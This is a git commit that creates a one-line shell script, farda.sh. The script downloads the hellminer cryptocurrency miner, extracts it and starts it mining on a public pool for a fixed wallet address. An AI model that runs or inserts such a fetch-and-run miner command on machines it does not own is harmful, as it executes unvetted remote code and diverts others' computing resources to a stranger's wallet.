af83f88e6a3d282e257e48c90eb5fcad7708902d
adefff <108704960+adefff@users.noreply.github.com>
2023-06-02 15:14:43 +0700

    Create farda.sh

---
+++ farda.sh
@@ -0,0 +1,1 @@
+wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RNP9gsoRceBPvXUc8wKF5uNh1PKKuMUXTL.tc2 -p x
